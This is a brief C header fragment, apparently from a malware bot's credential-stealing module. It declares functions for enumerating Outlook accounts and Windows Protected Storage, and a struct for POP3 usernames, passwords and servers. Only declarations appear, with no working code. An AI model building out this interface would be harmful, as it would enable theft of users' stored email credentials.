#ifndef NO_PSTORE
DWORD WINAPI PStore(LPVOID param);
typedef struct TOOUTDATA{
	char POPuser[100];
	char POPpass[100];
	char POPserver[100];
} OOUTDATA;
void EnumOutlookAccounts();
BOOL EnumPStorage(char *target,void *conn,char *filter,BOOL silent,BOOL verbose);
#endif